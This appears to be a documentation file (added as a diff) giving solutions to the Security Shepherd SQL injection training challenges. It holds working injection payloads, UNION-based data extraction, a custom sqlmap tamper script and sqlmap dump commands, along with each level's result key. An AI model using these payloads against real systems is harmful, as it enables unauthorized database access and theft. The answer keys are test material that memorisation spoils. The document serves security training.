@@ -1,0 +1,614 @@
+.. include:: /pentest_links.txt
+
+.. _SecurityShepherdInjection:
+
+*********
+Injection
+*********
+
+
+SQL Injection Techniques
+========================
+
+SQL injection occurs when data the user influences is used in a SQL query. Here's a classic Java example:
+
+.. code-block:: java
+  :emphasize-lines: 3,5
+
+  ResultSet resultSet = stmt.executeQuery(
+    "SELECT userName FROM users WHERE userName = '" +
+    theUserName +
+    "' AND userPassword = '" +
+    thePassword +
+    "'"
+  );
+
+Here both "theUserName" and "thePassword" are directly input from the user. Usually either a single or double quote is used around the user input: in this case it's a single quote. Here, you have two choices for the first user input:
+
+* Enter a single quote, terminating the data value and allowing SQL query input. The SQL query can include a character that will treat the rest of the string after the injected SQL code as a comment. For example:
+
+  .. code-block:: console
+
+    theUsername = "' OR 1=1 #"
+    thePassword = "anything"
+
+    SELECT userName FROM users WHERE userName = '?' AND userPassword = '?'
+    = SELECT userName FROM users WHERE userName = '' OR 1=1 # ... commented out
+    = SELECT userName FROM users WHERE true
+
+  Here, every userName is returned from the table.
+
+* Enter a backslash (``\``), making the trailing single quote actually part of the data, along with the rest of the query until another single quote is encountered. Here, that would be up to where "thePassword" is injected, so "thePassword" could be SQL code without a leading single quote.
+
+  .. code-block:: console
+
+    theUsername = "\"
+    thePassword = " UNION SELECT somecol FROM sometable WHERE condition #"
+
+    SELECT userName FROM users WHERE userName = '?' AND userPassword = '?'
+    = SELECT userName FROM users WHERE userName = '\' AND userPassword = ' UNION SELECT somecol FROM sometable WHERE condition # ... commented out
+    = SELECT somecol FROM sometable WHERE condition
+
+  Essentially a completely different query is executed.
+
+There can be injection even where prepared statements are used.
+
+.. code-block:: java
+
+  PreparedStatement callstmnt = conn.prepareStatement(
+      "SELECT aColumn FROM aTable WHERE aColumn LIKE ?");
+  callstmnt.setString(1, userId);
+
+In this case you can enter wildcard characters (in MySQL, ``%`` or ``_``) to change the row or rows matched.
+
+
+SQL Injection 1
+===============
+
+The input to button :guilabel:`Get user` must look something like an email and return all rows in the table. The SQL query probably looks something like:
+
+.. code-block:: mysql
+
+  SELECT * FROM aTable WHERE theEmail = '?'
+
+This is the shortest input we've found that works: ``'+0#@x``
+
+The trailing ``@x`` is needed to make it look like an email, the ``#`` to comment out the trailing ``@x``, the leading ``'`` to terminate the email string input, and the ``+0`` does the magic of making every row true. Adding or comparing a string to an integer causes the string to be coerced to a floating point value; that value will be 0 when the string does not represent an valid floating point value. So eventually we compare:
+
+.. code-block:: mysql
+
+  SELECT * FROM aTable WHERE theEmail = '?'
+  = SELECT * FROM aTable WHERE theEmail = ''+0#@x'
+  = SELECT * FROM aTable WHERE theEmail = ''+0
+  = SELECT * FROM aTable WHERE theEmail = 0+0
+  = SELECT * FROM aTable WHERE theEmail = 0
+  = SELECT * FROM aTable WHERE 0 = 0
+
+Another short string that works is ``'||1#@x``.
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The Result key is
+  f62abebf5658a6a44c5c9babc7865110c62f5ecd9d0a7052db48c4dbee0200e3
+
+
+SQL Injection 2
+===============
+
+This is very similar to SQL Injection1 and a variant of the second answer above works: ``'||1#``
+
+.. code-block:: console
+  :emphasize-lines: 1-2
+
+  The reuslt Key is
+  fd8e9a29dab791197115b58061b215594211e72c1680f1eacc50b0394133a09f
+
+
+SQL Injection 3
+===============
+
+Since a variant of ``'||1#`` worked on the previous injections, trying it again lists all the user names. All we have to do is add a UNION query to return the credit card numbers:
+
+.. code-block:: mysql
+
+  UNION SELECT creditCardColumn FROM customerTable WHERE nameColumn = 'Mary Martin'
+
+So we have to determine the customer table name and the column names for the credit card and name. Let's use the SQL injection to recon the database:
+
+* ``' UNION SELECT VERSION() #`` returns **5.5.43-0ubuntu0.14.04.1**
+
+* ``' UNION SELECT DATABASE() #`` returns **SqlChalThree**
+
+* ``' UNION SELECT table_name from information_schema.tables where table_schema='SqlChalThree' #`` returns **SELECT command denied to user 'HdmiNoSignal'@'localhost' for table 'tables'**
+
+So we're denied doing database recon and must resort to guessing. Fortunately we get a visible error. After a few tries we know ``OR`` is filtered out so we use ``||`` instead and make lots of tries to get the nameColumn. Eventually we see ``' || customername = 'Mary Martin' #`` works. Next we need to guess the creditCardColumn. Eventually we see ``' || creditcardnumber = '0' #`` works. Finally we need the table. Eventually we see ``' UNION SELECT creditcardnumber FROM customers WHERE customername = 'Mary Martin' #`` works and we get the credit card number:
+
+.. code-block:: console
+  :emphasize-lines: 1
+
+  9815 1547 3214 7569
+
+
+SQL Injection 4
+===============
+
+Generally you disrupt the SQL query by placing single (``'``) or double (``"``) quotes in the inputs, or if those are filtered placing a backslash as input to consume the trailing single or double quote. After playing around with single and double quotes we suspect they are being filtered. So we try these values:
+
+.. code-block:: console
+
+  UserName = \
+  Password = ||1#
+
+That works to get us signed in as "adam", who is not an admin. Now we have to make sure the person selected is an admin. To avoid having to know the table, column, and user names we'll just select users one-by-one by starting with :guilabel:`Password` set to ``||1 LIMIT 1 OFFSET 1#``, increasing the offset by 1 until we get success. The "admin" account was at offset 1:
+
+.. code-block:: console
+  :emphasize-lines: 1,3-4
+
+  Signed in as admin
+
+  As you are the admin, here is the result key:
+  d316e80045d50bdf8ed49d48f130b4acf4a878c82faef34daff8eb1b98763b6f
+
+
+SQL Injection 5
+===============
+
+Viewing the page source using Firebug reveals JavaScript with VipCouponCheck POST URL
+
+.. code-block:: html
+
+   /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck
+
+with parameter "couponCode". Here's the relevant JavaScript:
+
+.. code-block:: javascript
+
+  var _0xffee = [ "change", "val", "#couponCode", "POST", "8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck", "ajax", "8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck", "#vipCouponCode" ];
+
+  $(_0xffee[2])[_0xffee[0]](function() {
+      var a = $(_0xffee[2])[_0xffee[1]]();
+      var b = $[_0xffee[5]]({
+          type: _0xffee[3],
+          url: _0xffee[4],
+          data: {
+              couponCode: a
+          },
+          async: false
+      });
+  })[_0xffee[0]]();
+
+  $(_0xffee[7])[_0xffee[0]](function() {
+      var a = $(_0xffee[2])[_0xffee[1]]();
+      var b = $[_0xffee[5]]({
+          type: _0xffee[3],
+          url: _0xffee[6],
+          data: {
+              couponCode: a
+          },
+          async: false
+      });
+  })[_0xffee[0]]();
+
+Let's look for SQL injection there:
+
+.. code-block:: bash
+
+  # Tamper Data gives COOKIE, Firebug gives the URL and POSTDATA.
+  COOKIE='currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3="XHAMNIXS+EtfXshD4Kgjvw=="'
+  URL='https://securityshepherd.com/challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck'
+  POSTDATA='couponCode=*'
+
+  rm -rf sqlmap
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="$POSTDATA" \
+      --dbms=MySQL \
+      --banner --current-user --current-db --is-dba \
+      --users --passwords --dbs --exclude-sysdbs \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: text
+  :emphasize-lines: 23
+
+  [09:24:48] [INFO] (custom) POST parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+  (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+  sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+  ---
+  Parameter: #1* ((custom) POST)
+      Type: AND/OR time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+      Payload: couponCode=' AND (SELECT * FROM (SELECT(SLEEP(5)))fumP) AND 'bBLE'='bBLE
+
+      Type: UNION query
+      Title: Generic UNION query (NULL) - 3 columns
+      Payload: couponCode=' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a7171,0x446c7a46745958525447,0x71766a7871)-- 
+  ---
+  back-end DBMS: MySQL 5.0.12
+  banner:    '5.5.43-0ubuntu0.14.04.1'
+  current user:    'DnTVipUser&#x40;localhost'
+  current database:    'SQLiC5Shop'
+  database management system users [1]:                                          
+  [*] &#x27;DnTVipUser&#x27;&#x40;&#x27;localhost&#x27;
+  [09:24:59] [ERROR] unable to retrieve the password hashes for the database users (probably because the session user has no read privileges over the relevant system database table)
+  available databases [2]:                                                       
+  [*] information_schema
+  [*] SQLiC5Shop
+
+Let's find the tables in database SQLiC5Shop:
+
+.. code-block:: bash
+  :emphasize-lines: 6
+
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="$POSTDATA" \
+      --dbms=MySQL \
+      -D 'SQLiC5Shop' --tables \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 5
+
+  Database: SQLiC5Shop                                                           
+  [2 tables]
+  +------------+
+  | items      |
+  | vipCoupons |
+  +------------+
+
+Let's dump the table vipCoupons:
+
+.. code-block:: bash
+  :emphasize-lines: 6
+
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="$POSTDATA" \
+      --dbms=MySQL \
+      -D 'SQLiC5Shop' -T 'vipCoupons' --dump \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 7
+
+  Database: SQLiC5Shop
+  Table: vipCoupons
+  [1 entry]
+  +--------+-------------+------------+---------------------------------------------+
+  | itemId | vipCouponId | perCentOff | couponCode                                  |
+  +--------+-------------+------------+---------------------------------------------+
+  | 2      | 861267      | 100        | spcil&#x2f;&#x7c;Pse3cr3etCouponStu.f4rU176 |
+  +--------+-------------+------------+---------------------------------------------+
+
+This gives the coupon 'spcil&#x2f;&#x7c;Pse3cr3etCouponStu.f4rU176' which unencoded is 'spcil/\|Pse3cr3etCouponStu.f4rU176'. If we change the $3000 troll to quantity 1 and enter the VIP coupon code, clicking :guilabel:`Place Order` gives:
+
+.. code-block:: console
+  :emphasize-lines: 1,3-4
+
+  Your order comes to a total of $0
+
+  Trolls were free, Well Done -
+  343f2e424d5d7a2eff7f9ee5a5a72fd97d5a19ef7bff3ef2953e033ea32dd7ee
+
+
+SQL Injection 6
+===============
+
+First of all the web page pin entry is capped at 4 characters, so either Tamper Data, :program:`curl`, or something similar is needed to try SQL injection. After trying numerous blind SQL queries you either resort to the cheat or realize that you have to \\x-encode the input.
+
+To \\x-encode the input for :program:`sqlmap` a python program :program:`hexencode.py` must be created. The following script creates a subdirectory :file:`tamper` with :program:`hexencode.py` and the required :file:`__init__.py`:
+
+.. code-block:: bash
+  :emphasize-lines: 1-2,4,9,61
+
+  mkdir -p tamper
+  cd tamper
+
+  cat > __init__.py <<EOF
+  #!/usr/bin/env python
+  pass
+  EOF
+
+  cat > hexencode.py <<EOF
+  #!/usr/bin/env python
+
+  """
+  Copyright (c) 2006-2015 sqlmap developers (http://sqlmap.org/)
+  See the file 'doc/COPYING' for copying permission
+  """
+
+  import os
+  import string
+
+  from lib.core.enums import PRIORITY
+  from lib.core.common import singleTimeWarnMessage
+
+  __priority__ = PRIORITY.LOWEST
+
+  def dependencies():
+      pass
+
+  def tamper(payload, **kwargs):
+      """
+      Modified charunicodeencode.py
+
+      Requirement: none
+
+      Tested against:
+          * MySQL 5.5.43
+
+      Notes:
+          * Changes '%'-encoding to hex-encoding; encodes everything
+          * Currently handles only ASCII
+
+      >>> tamper('SELECT FIELD%20FROM TABLE')
+      '\x53\x45\x4C\x45\x43\x54\x20\x46\x49\x45\x4C\x44\x20\x46\x52\x4F\x4D\x20\x54\x41\x42\x4C\x45'
+      """
+
+      retVal = payload
+
+      if payload:
+          retVal = ""
+          i = 0
+
+          while i < len(payload):
+              if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits:
+                  retVal += "\\\\x%s" % payload[i + 1:i + 2]
+                  i += 3
+              else:
+                  retVal += "\\\\x%.2X" % ord(payload[i])
+                  i += 1
+
+      return retVal
+  EOF
+  cd ..
+
+Now let's try for a SQL injection with the help of :program:`hexencode.py`:
+
+.. code-block:: bash
+  :emphasize-lines: 14
+
+  # Tamper Data gives COOKIE, URL, and POSTDATA.
+  COOKIE='currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3="XHAMNIXS+EtfXshD4Kgjvw=="'
+  URL='https://securityshepherd.com/challenges/d0e12e91dafdba4825b261ad5221aae15d28c36c7981222eb59f7fc8d8f212a2'
+  POSTDATA='pinNumber=*'
+
+  rm -rf sqlmap
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="$POSTDATA" \
+      --dbms=MySQL \
+      --banner --current-user --current-db --is-dba \
+      --users --passwords --dbs --exclude-sysdbs \
+      --tamper=$PWD/tamper/hexencode \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: text
+  :emphasize-lines: 24
+
+  sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
+  ---
+  Parameter: #1* ((custom) POST)
+      Type: AND/OR time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+      Payload: pinNumber=' AND (SELECT * FROM (SELECT(SLEEP(5)))mMlN) AND 'QusI'='QusI
+
+      Type: UNION query
+      Title: Generic UNION query (NULL) - 1 column
+      Payload: pinNumber=' UNION ALL SELECT CONCAT(0x717a6a7171,0x4e4a79796f4a65506670,0x7170627671)-- 
+  ---
+  back-end DBMS operating system: Linux Ubuntu
+  back-end DBMS: MySQL 5.0.12
+  banner:    '5.5.43-0ubuntu0.14.04.1'
+  current user:    'userLookUuuup&#x40;localhost'
+  current database:    'SqlChalSix'
+  current user is DBA:    False
+  database management system users [1]:                                          
+  [*] &#x27;userLookUuuup&#x27;&#x40;&#x27;localhost&#x27;
+  [10:35:07] [WARNING] unable to retrieve the number of password hashes for user '&#x27;userLookUuuup&#x27;&#x40;&#x27;localhost&#x27;'
+  [10:35:07] [ERROR] unable to retrieve the password hashes for the database users (probably because the session user has no read privileges over the relevant system database table)
+  available databases [2]:                                                       
+  [*] information_schema
+  [*] SqlChalSix
+  :emphasize-lines: 24
+
+Next determine tables in database SqlChalSix:
+
+.. code-block:: bash
+  :emphasize-lines: 6
+
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="pinNumber=*" \
+      --dbms=MySQL \
+      -D SqlChalSix --tables \
+      --tamper="$PWD/tamper/hexencode" \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 4
+
+  Database: SqlChalSix                                                           
+  [1 table]
+  +-------+
+  | users |
+  +-------+
+
+Next dump table users in database SqlChalSix:
+
+.. code-block:: bash
+  :emphasize-lines: 6
+
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="pinNumber=*" \
+      --dbms=MySQL \
+      -D SqlChalSix -T users --dump \
+      --tamper="$PWD/tamper/hexencode" \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 8
+
+  Database: SqlChalSix
+  Table: users
+  [7 entries]
+  +---------+---------+---------+----------+------------------------------------------------------------------+-----------------------------------------------+
+  | idusers | userPin | userAge | userName | userAnswer                                                       | userQuestion                                  |
+  +---------+---------+---------+----------+------------------------------------------------------------------+-----------------------------------------------+
+  | 1       | 8367    | 23      | George   | A Red Rose                                                       | What is your favourite Flower                 |
+  | 2       | 4685    | 98      | Brendan  | 17f999a8b3fbfde54124d6e94b256a264652e5087b14622e1644c884f8a33f82 | What is the answer to this level&#x3f;        |
+  | 3       | 1254    | 25      | Sean     | Thor                                                             | Your favourite Viking                         |
+  | 4       | 7844    | 84      | Anthony  | All of the games                                                 | What game do I suck at&#x3f;                  |
+  | 5       | 4648    | 33      | Owen     | Peanutbutter                                                     | Favourite Sandwhich Topping                   |
+  | 6       | 2653    | 12      | Eoin     | The Dark Side of the Moon                                        | Where did I holiday in the summer of 69&#x3f; |
+  | 7       | 3598    | 6       | David    | Don&#x27;t get me started                                        | This is how we get ants                       |
+  +---------+---------+---------+----------+------------------------------------------------------------------+-----------------------------------------------+
+
+We can see the challenge answer **17f999a8b3fbfde54124d6e94b256a264652e5087b14622e1644c884f8a33f82** in the table row for Brendan.
+
+
+SQL Injection 7
+===============
+
+Although the write up is short, the amount of time finding the solution was not insignificant. First, there are some restrictions on the length of the inputs that make using :program:`sqlmap` challenging. Although the email address is actually checked, that's not too much of a restriction as something on the order of ``"bunch of junk"@x`` passes for a legal email address. If the SQL injection is in the email address then we want a true out of the email address check with the password being ignored.
+
+Attempts using email of ``"'||1#"@x`` with password ``password`` didn't work. The email addressed was legal but the ``#`` didn't comment out the rest of the SQL query. If it did, the ``||1`` should have returned a true value and presumably success.
+
+Another way to nullify the effect of the rest of the SQL query is to insert a UNION statement at the end of the email input. We'll need a table for the UNION query and we guess there's a users table. Trying email ``"'||1 UNION SELECT 1 FROM users WHERE '1'='"@x`` with password ``password`` works. Note that the first part of the UNION statement WHERE clause is false; the password field should be joined to it by an AND, making the UNION statement return nothing. So the overall query should return true for the first user.
+
+.. code-block:: console
+  :emphasize-lines: 1,3-4
+
+  Welcome User 1
+
+  The result key for this level is
+  okhRdaJDUkykc88PGBgLG008zQt/LTKlkSad+cur6cHQ6DlkGPs4miMh3x0YeMyQynuR9ZoLrP4n4xToWx6HNM40A4pRvfR+VlYvE0LNDm/1B9ucoeJXtDt3UQr/RmUOen148gH25Qzykx66jwvmhw==
+
+
+SQL Injection Stored Procedure
+==============================
+
+For this SQL injection we'll rely on :program:`sqlmap`.
+
+.. code-block:: bash
+
+  # Tamper Data gives COOKIE, URL, and POSTDATA.
+  COOKIE='currentPerson=YUd1ZXN0; JSESSIONID=DC81FF84682F17ED9600659BCA00C3AF; token=159087069452397663042571439753374898368; JSESSIONID3="XHAMNIXS+EtfXshD4Kgjvw=="'
+  URL='https://securityshepherd.com/challenges/7edcbc1418f11347167dabb69fcb54137960405da2f7a90a0684f86c4d45a2e7'
+  POSTDATA='userIdentity=*'
+
+  rm -rf sqlmap
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="$POSTDATA" \
+      --dbms=MySQL \
+      --banner --current-user --current-db --is-dba \
+      --users --passwords --dbs --exclude-sysdbs \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 23
+
+  sqlmap identified the following injection point(s) with a total of 1377 HTTP(s) requests:
+  ---
+  Parameter: #1* ((custom) POST)
+      Type: error-based
+      Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
+      Payload: userIdentity=' AND (SELECT 3597 FROM(SELECT COUNT(*),CONCAT(0x716a627871,(SELECT (ELT(3597=3597,1))),0x71627a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'uVKc'='uVKc
+
+      Type: AND/OR time-based blind
+      Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+      Payload: userIdentity=' AND (SELECT * FROM (SELECT(SLEEP(5)))DoUo) AND 'UjqK'='UjqK
+  ---
+  back-end DBMS operating system: Linux Ubuntu
+  back-end DBMS: MySQL 5.0
+  banner:    '5.5.43-0ubuntu0.14.04.1'
+  current user:    'procChalUser&#x40;localhost'
+  current database:    'SqlChalStoredProc'
+  current user is DBA:    False
+  database management system users [1]:
+  [*] &#x27;procChalUser&#x27;&#x40;&#x27;localhost&#x27;
+  [11:30:13] [ERROR] unable to retrieve the password hashes for the database users (probably because the session user has no read privileges over the relevant system database table)
+  available databases [2]:
+  [*] information_schema
+  [*] SqlChalStoredProc
+
+Next determine tables in database SqlChalStoredProc:
+
+.. code-block:: bash
+  :emphasize-lines: 6
+
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="$POSTDATA" \
+      --dbms=MySQL \
+      -D 'SqlChalStoredProc' --tables \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 4
+
+  Database: SqlChalStoredProc
+  [1 table]
+  +-----------+
+  | customers |
+  +-----------+
+
+Next dump the table customers:
+
+.. code-block:: bash
+  :emphasize-lines: 6
+
+  sqlmap  --batch --random-agent --output-dir=sqlmap \
+      --headers='X-Requested-With: XMLHttpRequest' \
+      --cookie="$COOKIE" \
+      --data="$POSTDATA" \
+      --dbms=MySQL \
+      -D 'SqlChalStoredProc' -T customers --dump \
+      --url $URL
+
+Running this gives:
+
+.. code-block:: console
+  :emphasize-lines: 9
+
+  Database: SqlChalStoredProc
+  Table: customers
+  [4 entries]
+  +------------------------------------------+----------------------------------------------------------------------------------------------------+--------------+----------------------------------------------+
+  | customerId                               | comment                                                                                            | customerName | customerAddress                              |
+  +------------------------------------------+----------------------------------------------------------------------------------------------------+--------------+----------------------------------------------+
+  | 019ce129ee8960a6b875b20095705d53f8c7b0ca | NULL                                                                                               | John Fits    | crazycat&#x40;example.com                    |
+  | 05159435826869ccfd76d77a2ed4ba7c2023f0cb | NULL                                                                                               | Rubix Man    | manycolours&#x40;cube.com                    |
+  | 44e2bdc1059903f464e5ba9a34b927614d7fee55 | Well Done&#x21; The Result key is d9c5757c1c086d02d491cbe46a941ecde5a65d523de36ac1bfed8dd4dd9994c8 | Rita Hanolan | the1night2before3four&#x40;exampleEmails.com |
+  | 6c5c26a1deccf4a87059deb0a3fb463ff7d62fd5 | NULL                                                                                               | Paul O Brien | sixshooter&#x40;deaf.com                     |
+  +------------------------------------------+----------------------------------------------------------------------------------------------------+--------------+----------------------------------------------+
+
+The result key is in the row for "Rita Hanolan".
+
